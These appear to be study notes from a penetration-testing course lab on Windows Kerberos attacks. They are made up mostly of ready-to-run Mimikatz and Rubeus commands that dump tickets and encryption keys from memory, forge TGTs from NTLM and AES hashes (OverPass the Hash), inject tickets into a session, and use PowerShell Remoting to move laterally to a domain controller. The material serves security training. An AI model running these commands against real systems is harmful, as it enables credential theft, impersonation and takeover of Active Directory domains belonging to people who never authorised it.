# Pass the Ticket (PtT) from Windows

### Harvesting Kerberos Tickets from Windows

**Rubeus - Export Tickets**

```cmd-session
Rubeus.exe dump /nowrap
```

**Mimikatz - Export Tickets**

```cmd-session
mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::tickets /export
```

```cmd-session
exit
```

* The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory.
* User tickets have the user's name,
  * followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.
* We can also export tickets using Rubeus and the option dump
  * This option can be used to dump all tickets (if running as a local administrator).&#x20;
* `Rubeus dump`, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option `/nowrap` for easier copy-paste.

***

* Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the `OverPass the Hash or Pass the Key` technique.
  * [Pass the Hash (PtH)](app://obsidian.md/Pass%20the%20Hash%20\(PtH\))

### Pass the Key or OverPass the Hash

* The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos
* The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.
  * technique was developed by Benjamin Delpy and Skip Duckwall in their presentation [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18)
* To forge our tickets, we need to have the user's hash
  * we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`

**Mimikatz - Extract Kerberos Keys**

```cmd-session
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

**Mimikatz - Pass the Key or OverPass the Hash**

```cmd-session
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

**Rubeus - Pass the Key or OverPass the Hash**

```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

### Pass the Ticket (PtT)

**Rubeus Pass the Ticket**

```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

* Another way is to import the ticket into the current session using the .kirbi file from the disk.

**Rubeus - Pass the Ticket**

```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

**Convert .kirbi to Base64 Format**

```powershell-session
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

* Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

**Pass the Ticket - Base64 Format**

```cmd-session
 Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

**Mimikatz - Pass the Ticket**

```cmd-session
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

```
dir \\DC01.inlanefreight.htb\c$
```

### Pass The Ticket with PowerShell Remoting (Windows)

* [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer.
  * Administrators often use PowerShell Remoting to manage remote computers on the network
  * Enabling PowerShell Remoting creates both HTTP and HTTPS listeners.
    * The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.
* To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.
  * Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.

### Mimikatz - PowerShell Remoting with Pass the Ticket

```cmd-session
mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```cmd-session
exit
```

```cmd-session
powershell
```

```cmd-session
Enter-PSSession -ComputerName DC01
```

```cmd-session
[DC01]: PS C:\Users\john\Documents> whoami
```

```cmd-session
[DC01]: PS C:\Users\john\Documents> hostname
```

### Rubeus - PowerShell Remoting with Pass the Ticket

```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

* The above command will open a new cmd window.
* From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

**Rubeus - Pass the Ticket for Lateral Movement**

```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

```cmd-session
powershell
```

```cmd-session
Enter-PSSession -ComputerName DC01
```

```cmd-session
[DC01]: PS C:\Users\john\Documents> whoami

inlanefreight\john
```

\
